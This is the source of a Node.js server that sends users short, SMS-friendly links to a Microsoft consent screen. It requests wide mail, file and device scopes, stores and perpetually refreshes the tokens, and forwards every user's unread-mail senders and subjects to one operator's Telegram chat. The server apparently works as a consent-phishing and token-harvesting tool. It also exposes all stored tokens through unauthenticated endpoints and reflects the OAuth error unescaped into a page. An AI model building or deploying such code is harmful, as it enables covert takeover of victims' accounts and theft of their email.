require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cron = require('node-cron');
const TokenStorage = require('./tokenStorage');
const TelegramNotifier = require('./telegramNotifier');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize storage and notifier
const tokenStorage = new TokenStorage();
const telegramNotifier = new TelegramNotifier(process.env.TELEGRAM_BOT_TOKEN, process.env.TELEGRAM_CHAT_ID);

// State storage for OAuth flows (in production, use Redis or database)
const authStates = new Map();

// Track cron job activity
const cronStatus = {
  lastRun: null,
  lastRefreshCount: 0,
  totalRefreshes: 0,
  errors: []
};

// Utility: Generate short code
function generateShortCode(length = 6) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// Microsoft OAuth Configuration
const MICROSOFT_CONFIG = {
  clientId: process.env.CLIENT_ID,
  clientSecret: process.env.CLIENT_SECRET,
  tenantId: process.env.TENANT_ID || 'common',
  redirectUri: process.env.REDIRECT_URI,
  scope: process.env.SCOPES || 'User.Read Mail.ReadWrite Files.Read Files.Read.All Notes.Read Device.Read email openid profile offline_access'
};

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'running',
    endpoints: {
      '/auth/login': 'Initiate OAuth flow',
      '/auth/magic-link': 'POST - Generate magic auth link for a user',
      '/auth/link/:userId': 'GET - Simple magic link generation',
      '/auth/quick/:msftUserId': 'GET - Quick auth with Microsoft user ID',
      '/s/:shortCode': 'Short link redirect',
      '/auth/authorize/:userId': 'Auto-authorize link for user',
      '/auth/callback': 'OAuth callback',
      '/auth/token': 'Get current token(s)',
      '/auth/stats': 'Get database statistics',
      '/auth/cron-status': 'Get cron job status',
      '/polling/start': 'Start polling notifications',
      '/polling/stop': 'Stop polling',
      '/health': 'Health check'
    }
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  const { userId = 'default' } = req.query;
  const token = tokenStorage.getToken(userId);
  const stats = tokenStorage.getStats();
  const shortLinkStats = tokenStorage.getShortLinkStats();
  
  res.json({
    status: 'healthy',
    database: stats,
    shortLinks: shortLinkStats,
    hasToken: !!token,
    tokenExpiry: token ? new Date(token.expires_at) : null,
    cron: {
      lastRun: cronStatus.lastRun,
      lastRefreshCount: cronStatus.lastRefreshCount,
      totalRefreshes: cronStatus.totalRefreshes
    }
  });
});

// Generate magic link for a user (backend endpoint)
app.post('/auth/magic-link', async (req, res) => {
  const { userId, userEmail, metadata = {}, shortLink = true } = req.body;
  
  if (!userId) {
    return res.status(400).json({ error: 'userId is required' });
  }

  // Generate unique state for this auth flow
  const state = `${userId}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  
  // Store state with user info (expires in 10 minutes)
  authStates.set(state, {
    userId,
    userEmail,
    metadata,
    createdAt: Date.now(),
    expiresAt: Date.now() + 10 * 60 * 1000
  });

  // Clean up expired states
  cleanupExpiredStates();

  // Generate magic link
  const baseUrl = process.env.BASE_URL || `http://localhost:${PORT}`;
  const magicLink = `${baseUrl}/auth/authorize/${userId}?state=${state}`;
  
  let finalLink = magicLink;
  let shortCode = null;
  
  // Generate short link if requested
  if (shortLink) {
    shortCode = generateShortCode(6);
    tokenStorage.saveShortLink(shortCode, magicLink, userId, 10);
    finalLink = `${baseUrl}/s/${shortCode}`;
  }
  
  console.log(`Magic link generated for user ${userId}${shortCode ? ` (short: ${shortCode})` : ''}`);
  res.json({ 
    success: true,
    link: finalLink,
    magicLink: magicLink,
    shortLink: shortCode ? finalLink : null,
    shortCode: shortCode,
    userId,
    expiresIn: 600 // seconds
  });
});

// Simple GET endpoint for magic link generation
app.get('/auth/link/:userId', (req, res) => {
  const { userId } = req.params;
  const { email, returnJson, noShort } = req.query;
  
  if (!userId) {
    return res.status(400).json({ error: 'userId is required' });
  }

  // Generate unique state for this auth flow
  const state = `${userId}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  
  // Store state with user info (expires in 10 minutes)
  authStates.set(state, {
    userId,
    userEmail: email || null,
    metadata: {},
    createdAt: Date.now(),
    expiresAt: Date.now() + 10 * 60 * 1000
  });

  // Clean up expired states
  cleanupExpiredStates();

  // Generate magic link
  const baseUrl = process.env.BASE_URL || `http://localhost:${PORT}`;
  const magicLink = `${baseUrl}/auth/authorize/${userId}?state=${state}`;
  
  let finalLink = magicLink;
  let shortCode = null;
  
  // Generate short link by default (unless noShort=true)
  if (!noShort) {
    shortCode = generateShortCode(6);
    tokenStorage.saveShortLink(shortCode, magicLink, userId, 10);
    finalLink = `${baseUrl}/s/${shortCode}`;
  }
  
  console.log(`Magic link generated for user ${userId}${shortCode ? ` (short: ${shortCode})` : ''}`);
  
  // Return JSON or redirect to the magic link
  if (returnJson) {
    res.json({ 
      success: true,
      link: finalLink,
      magicLink: magicLink,
      shortLink: shortCode ? finalLink : null,
      shortCode: shortCode,
      userId,
      expiresIn: 600
    });
  } else {
    // Redirect directly to authorize flow
    res.redirect(finalLink);
  }
});

// Quick auth with Microsoft user ID (optimized for SMS)
app.get('/auth/quick/:msftUserId', (req, res) => {
  const { msftUserId } = req.params;
  
  if (!msftUserId) {
    return res.status(400).send('Microsoft User ID required');
  }

  // Generate unique state for this auth flow
  const state = `${msftUserId}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  
  // Store state with user info (expires in 10 minutes)
  authStates.set(state, {
    userId: msftUserId,
    userEmail: null,
    metadata: { source: 'quick-link' },
    createdAt: Date.now(),
    expiresAt: Date.now() + 10 * 60 * 1000
  });

  // Clean up expired states
  cleanupExpiredStates();

  // Generate magic link
  const baseUrl = process.env.BASE_URL || `http://localhost:${PORT}`;
  const magicLink = `${baseUrl}/auth/authorize/${msftUserId}?state=${state}`;
  
  // Always generate short link for quick endpoint
  const shortCode = generateShortCode(6);
  tokenStorage.saveShortLink(shortCode, magicLink, msftUserId, 10);
  const shortLink = `${baseUrl}/s/${shortCode}`;
  
  console.log(`Quick auth link for Microsoft user ${msftUserId} (short: ${shortCode})`);
  
  // Redirect to short link
  res.redirect(shortLink);
});

// Short link redirect handler
app.get('/s/:shortCode', (req, res) => {
  const { shortCode } = req.params;
  
  const linkData = tokenStorage.getShortLink(shortCode);
  
  if (!linkData) {
    return res.status(404).send(`
      <html>
        <head><title>Link Expired</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h2>⏱️ Link Expired or Invalid</h2>
          <p>This authorization link has expired or doesn't exist.</p>
          <p>Please request a new link.</p>
        </body>
      </html>
    `);
  }
  
  console.log(`Short link ${shortCode} → ${linkData.targetUrl} (click #${linkData.clicks})`);
  res.redirect(linkData.targetUrl);
});

// Auto-authorize endpoint (the link users click)
app.get('/auth/authorize/:userId', (req, res) => {
  const { userId } = req.params;
  const { state } = req.query;
  
  if (!state || !authStates.has(state)) {
    return res.status(400).send(`
      <html>
        <head><title>Invalid Link</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h2>❌ Invalid or Expired Authorization Link</h2>
          <p>This link is invalid or has expired. Please request a new one.</p>
        </body>
      </html>
    `);
  }

  const stateData = authStates.get(state);
  if (stateData.userId !== userId) {
    return res.status(400).send('Invalid user ID');
  }

  // Build Microsoft auth URL with prompt=none for silent auth
  const authUrl = `https://login.microsoftonline.com/${MICROSOFT_CONFIG.tenantId}/oauth2/v2.0/authorize?` +
    `client_id=${MICROSOFT_CONFIG.clientId}` +
    `&response_type=code` +
    `&redirect_uri=${encodeURIComponent(MICROSOFT_CONFIG.redirectUri)}` +
    `&response_mode=query` +
    `&scope=${encodeURIComponent(MICROSOFT_CONFIG.scope)}` +
    `&state=${encodeURIComponent(state)}` +
    `&prompt=consent`; // Use 'consent' for first-time, or 'none' for silent
  
  console.log(`User ${userId} redirecting to auth...`);
  res.redirect(authUrl);
});

// Manual login endpoint (for testing)
app.get('/auth/login', (req, res) => {
  const state = `manual_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  
  authStates.set(state, {
    userId: 'manual',
    createdAt: Date.now(),
    expiresAt: Date.now() + 10 * 60 * 1000
  });

  const authUrl = `https://login.microsoftonline.com/${MICROSOFT_CONFIG.tenantId}/oauth2/v2.0/authorize?` +
    `client_id=${MICROSOFT_CONFIG.clientId}` +
    `&response_type=code` +
    `&redirect_uri=${encodeURIComponent(MICROSOFT_CONFIG.redirectUri)}` +
    `&response_mode=query` +
    `&scope=${encodeURIComponent(MICROSOFT_CONFIG.scope)}` +
    `&state=${encodeURIComponent(state)}`;
  
  console.log('Manual auth flow started');
  res.redirect(authUrl);
});

// OAuth callback endpoint
app.get('/auth/callback', async (req, res) => {
  const { code, error, error_description, state } = req.query;

  // Get user info from state
  let userData = null;
  if (state && authStates.has(state)) {
    userData = authStates.get(state);
  }

  if (error) {
    console.error('OAuth error:', error, error_description);
    await telegramNotifier.sendMessage(`❌ OAuth Error: ${error}\n${error_description}`);
    
    return res.status(400).send(`
      <html>
        <head><title>Authorization Failed</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h2>❌ Authorization Failed</h2>
          <p><strong>Error:</strong> ${error}</p>
          <p>${error_description || ''}</p>
          ${userData ? `<p>User: ${userData.userId}</p>` : ''}
        </body>
      </html>
    `);
  }

  if (!code) {
    return res.status(400).send('No authorization code received');
  }

  try {
    // Exchange code for token
    const tokenResponse = await axios.post(
      `https://login.microsoftonline.com/${MICROSOFT_CONFIG.tenantId}/oauth2/v2.0/token`,
      new URLSearchParams({
        client_id: MICROSOFT_CONFIG.clientId,
        client_secret: MICROSOFT_CONFIG.clientSecret,
        code: code,
        redirect_uri: MICROSOFT_CONFIG.redirectUri,
        grant_type: 'authorization_code',
        scope: MICROSOFT_CONFIG.scope
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const tokenData = tokenResponse.data;
    tokenData.expires_at = Date.now() + (tokenData.expires_in * 1000);
    
    // Add user metadata if available
    if (userData) {
      tokenData.userId = userData.userId;
      tokenData.userEmail = userData.userEmail;
      tokenData.metadata = userData.metadata;
    }
    
    // Save token
    tokenStorage.saveToken(tokenData);
    
    // Clean up used state
    if (state) {
      authStates.delete(state);
    }
    
    // Notify via Telegram
    const userInfo = userData ? ` for user ${userData.userId}` : '';
    await telegramNotifier.sendMessage(`✅ OAuth authentication successful${userInfo}! Token saved and will be auto-refreshed.`);
    
    console.log(`Token saved successfully${userInfo}`);
    
    // Return success page
    res.send(`
      <html>
        <head>
          <title>Authorization Successful</title>
          <meta name="viewport" content="width=device-width, initial-scale=1">
        </head>
        <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5;">
          <div style="background: white; padding: 40px; border-radius: 10px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
            <h2 style="color: #28a745;">✅ Authorization Successful!</h2>
            ${userData ? `<p style="color: #666;">User: <strong>${userData.userId}</strong></p>` : ''}
            <p style="color: #666; margin: 20px 0;">Your Microsoft account has been connected successfully.</p>
            <p style="color: #999; font-size: 14px;">You can close this window now.</p>
            <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 5px;">
              <p style="margin: 0; font-size: 14px; color: #666;">✓ Token saved securely</p>
              <p style="margin: 5px 0 0 0; font-size: 14px; color: #666;">✓ Auto-refresh enabled</p>
            </div>
          </div>
          <script>
            // Optional: Auto-close after 3 seconds
            setTimeout(() => {
              window.close();
            }, 3000);
          </script>
        </body>
      </html>
    `);
  } catch (error) {
    console.error('Token exchange error:', error.response?.data || error.message);
    await telegramNotifier.sendMessage(`❌ Token exchange failed: ${error.message}`);
    
    res.status(500).send(`
      <html>
        <head><title>Token Exchange Failed</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h2>❌ Token Exchange Failed</h2>
          <p>There was an error processing your authorization.</p>
          <pre style="text-align: left; background: #f5f5f5; padding: 15px; border-radius: 5px;">${JSON.stringify(error.response?.data || error.message, null, 2)}</pre>
        </body>
      </html>
    `);
  }
});

// Get current token (for testing)
app.get('/auth/token', (req, res) => {
  const { userId } = req.query;
  
  if (userId) {
    // Get specific user's token
    const token = tokenStorage.getToken(userId);
    if (!token) {
      return res.status(404).json({ error: `No token found for user: ${userId}` });
    }
    
    res.json({
      userId: token.userId,
      userEmail: token.userEmail,
      hasToken: true,
      expiresAt: new Date(token.expires_at),
      expiresIn: Math.round((token.expires_at - Date.now()) / 1000),
      scopes: token.scope,
      createdAt: new Date(token.created_at),
      updatedAt: new Date(token.updated_at)
    });
  } else {
    // Get all users' tokens
    const allTokens = tokenStorage.getAllTokens();
    if (allTokens.length === 0) {
      return res.status(404).json({ error: 'No tokens found' });
    }
    
    res.json({
      count: allTokens.length,
      tokens: allTokens.map(t => ({
        userId: t.userId,
        userEmail: t.userEmail,
        expiresAt: new Date(t.expires_at),
        expiresIn: Math.round((t.expires_at - Date.now()) / 1000),
        isValid: t.expires_at > Date.now(),
        createdAt: new Date(t.created_at),
        updatedAt: new Date(t.updated_at)
      }))
    });
  }
});

// Manual token refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const { userId = 'default' } = req.body;
  
  try {
    const newToken = await refreshAccessToken(userId);
    res.json({ 
      success: true, 
      message: 'Token refreshed successfully',
      userId: userId,
      expiresIn: newToken.expires_in 
    });
  } catch (error) {
    res.status(500).json({ 
      error: 'Token refresh failed', 
      details: error.message 
    });
  }
});

// Delete token endpoint
app.delete('/auth/token/:userId', (req, res) => {
  const { userId } = req.params;
  const deleted = tokenStorage.deleteToken(userId);
  
  if (deleted) {
    res.json({ success: true, message: `Token deleted for user: ${userId}` });
  } else {
    res.status(404).json({ error: `No token found for user: ${userId}` });
  }
});

// Get database stats
app.get('/auth/stats', (req, res) => {
  const stats = tokenStorage.getStats();
  const expiringTokens = tokenStorage.getExpiringTokens(10);
  
  res.json({
    ...stats,
    expiringSoon: expiringTokens.length,
    expiringTokens: expiringTokens.map(t => ({
      userId: t.userId,
      userEmail: t.userEmail,
      expiresIn: Math.round((t.expires_at - Date.now()) / 1000)
    }))
  });
});

// Get cron job status
app.get('/auth/cron-status', (req, res) => {
  res.json({
    ...cronStatus,
    uptime: cronStatus.lastRun ? Math.round((Date.now() - cronStatus.lastRun) / 1000) : null,
    recentErrors: cronStatus.errors.slice(-5)
  });
});

// Polling endpoints
let pollingInterval = null;

app.post('/polling/start', async (req, res) => {
  const { intervalMinutes = 5 } = req.body;
  
  if (pollingInterval) {
    return res.json({ message: 'Polling already running' });
  }

  // Start polling
  pollingInterval = setInterval(async () => {
    await pollForNotifications();
  }, intervalMinutes * 60 * 1000);

  // Do initial poll
  await pollForNotifications();
  
  await telegramNotifier.sendMessage(`📊 Polling started! Checking every ${intervalMinutes} minutes.`);
  res.json({ success: true, message: `Polling started (every ${intervalMinutes} minutes)` });
});

app.post('/polling/stop', async (req, res) => {
  if (pollingInterval) {
    clearInterval(pollingInterval);
    pollingInterval = null;
    await telegramNotifier.sendMessage('⏸️ Polling stopped.');
  }
  res.json({ success: true, message: 'Polling stopped' });
});

// Polling function
async function pollForNotifications() {
  try {
    // Get all valid tokens and poll for each user
    const allTokens = tokenStorage.getAllTokens();
    const validTokens = allTokens.filter(t => t.expires_at > Date.now());
    
    if (validTokens.length === 0) {
      console.log('No valid tokens available for polling');
      return;
    }

    for (const token of validTokens) {
      try {
        // Check if token needs refresh
        if (token.expires_at - Date.now() < 5 * 60 * 1000) {
          console.log(`Token for ${token.userId} expiring soon, refreshing...`);
          await refreshAccessToken(token.userId);
          // Get refreshed token
          const refreshedToken = tokenStorage.getToken(token.userId);
          if (!refreshedToken) continue;
          token.access_token = refreshedToken.access_token;
        }

        // Example: Get unread emails
        const response = await axios.get(
          'https://graph.microsoft.com/v1.0/me/messages?$filter=isRead eq false&$top=5',
          {
            headers: {
              'Authorization': `Bearer ${token.access_token}`
            }
          }
        );

        const unreadMessages = response.data.value;
        
        if (unreadMessages.length > 0) {
          let notification = `📧 [${token.userId}] You have ${unreadMessages.length} unread email(s):\n\n`;
          unreadMessages.forEach((msg, idx) => {
            notification += `${idx + 1}. From: ${msg.from?.emailAddress?.name || 'Unknown'}\n`;
            notification += `   Subject: ${msg.subject || 'No subject'}\n`;
            notification += `   Received: ${new Date(msg.receivedDateTime).toLocaleString()}\n\n`;
          });
          
          await telegramNotifier.sendMessage(notification);
        } else {
          console.log(`No new notifications for ${token.userId}`);
        }
      } catch (error) {
        console.error(`Polling error for ${token.userId}:`, error.response?.data || error.message);
        if (error.response?.status === 401) {
          // Token might be invalid, try to refresh
          try {
            await refreshAccessToken(token.userId);
          } catch (refreshError) {
            await telegramNotifier.sendMessage(`❌ Token refresh failed for ${token.userId}. Please re-authenticate.`);
          }
        }
      }
    }
  } catch (error) {
    console.error('General polling error:', error.message);
  }
}

// Token refresh function
async function refreshAccessToken(userId = 'default') {
  const token = tokenStorage.getToken(userId);
  if (!token || !token.refresh_token) {
    throw new Error(`No refresh token available for user: ${userId}`);
  }

  console.log(`Refreshing access token for ${userId}...`);
  
  try {
    const tokenResponse = await axios.post(
      `https://login.microsoftonline.com/${MICROSOFT_CONFIG.tenantId}/oauth2/v2.0/token`,
      new URLSearchParams({
        client_id: MICROSOFT_CONFIG.clientId,
        client_secret: MICROSOFT_CONFIG.clientSecret,
        refresh_token: token.refresh_token,
        grant_type: 'refresh_token',
        scope: MICROSOFT_CONFIG.scope
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const newTokenData = tokenResponse.data;
    newTokenData.expires_at = Date.now() + (newTokenData.expires_in * 1000);
    newTokenData.userId = userId;
    newTokenData.userEmail = token.userEmail;
    newTokenData.metadata = token.metadata;
    
    // Save new token
    tokenStorage.saveToken(newTokenData);
    
    console.log(`Token refreshed successfully for ${userId}`);
    await telegramNotifier.sendMessage(`🔄 Access token refreshed for ${userId}!`);
    
    return newTokenData;
  } catch (error) {
    console.error(`Token refresh error for ${userId}:`, error.response?.data || error.message);
    await telegramNotifier.sendMessage(`❌ Token refresh failed for ${userId}: ${error.message}`);
    throw error;
  }
}

// Cron job for automatic token refresh (runs every 30 minutes to keep tokens alive)
cron.schedule('*/30 * * * *', async () => {
  const startTime = Date.now();
  console.log('🔄 Running scheduled token refresh check...');
  
  cronStatus.lastRun = startTime;
  let refreshCount = 0;
  
  try {
    // Get all tokens that will expire in less than 30 minutes
    // This ensures tokens are refreshed well before expiry
    const expiringTokens = tokenStorage.getExpiringTokens(30);
    
    console.log(`Found ${expiringTokens.length} token(s) to refresh`);
    
    for (const token of expiringTokens) {
      try {
        const expiresIn = Math.round((token.expires_at - Date.now()) / 60000);
        console.log(`Auto-refreshing token for ${token.userId} (expires in ${expiresIn}m)...`);
        await refreshAccessToken(token.userId);
        refreshCount++;
        cronStatus.totalRefreshes++;
      } catch (error) {
        const errorMsg = `Scheduled token refresh failed for ${token.userId}: ${error.message}`;
        console.error(errorMsg);
        cronStatus.errors.push({
          timestamp: Date.now(),
          userId: token.userId,
          error: error.message
        });
        // Keep only last 20 errors
        if (cronStatus.errors.length > 20) {
          cronStatus.errors.shift();
        }
      }
    }
    
    // Clean up expired tokens
    const cleaned = tokenStorage.cleanupExpiredTokens();
    if (cleaned > 0) {
      console.log(`🗑️  Cleaned up ${cleaned} expired token(s)`);
    }
    
    // Clean up expired short links
    const cleanedLinks = tokenStorage.cleanupExpiredShortLinks();
    if (cleanedLinks > 0) {
      console.log(`🗑️  Cleaned up ${cleanedLinks} expired short link(s)`);
    }
    
    cronStatus.lastRefreshCount = refreshCount;
    const duration = Math.round((Date.now() - startTime) / 1000);
    console.log(`✅ Cron job completed: ${refreshCount} refreshed, ${cleaned} cleaned up (${duration}s)`);
  } catch (error) {
    console.error('❌ Cron job error:', error.message);
    cronStatus.errors.push({
      timestamp: Date.now(),
      error: error.message
    });
  }
});

// Utility: Clean up expired states
function cleanupExpiredStates() {
  const now = Date.now();
  for (const [state, data] of authStates.entries()) {
    if (data.expiresAt < now) {
      authStates.delete(state);
      console.log(`Cleaned up expired state for user ${data.userId}`);
    }
  }
}

// Run cleanup every 5 minutes
setInterval(cleanupExpiredStates, 5 * 60 * 1000);

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM signal received: closing HTTP server');
  if (pollingInterval) {
    clearInterval(pollingInterval);
  }
  tokenStorage.close();
  process.exit(0);
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 Auth URL: http://localhost:${PORT}/auth/login`);
  console.log(`💾 Storage: SQLite database (persistent across restarts)`);
  console.log(`⏰ Token refresh: Every 30 minutes (keeps tokens alive)`);
  tokenStorage.init();
});
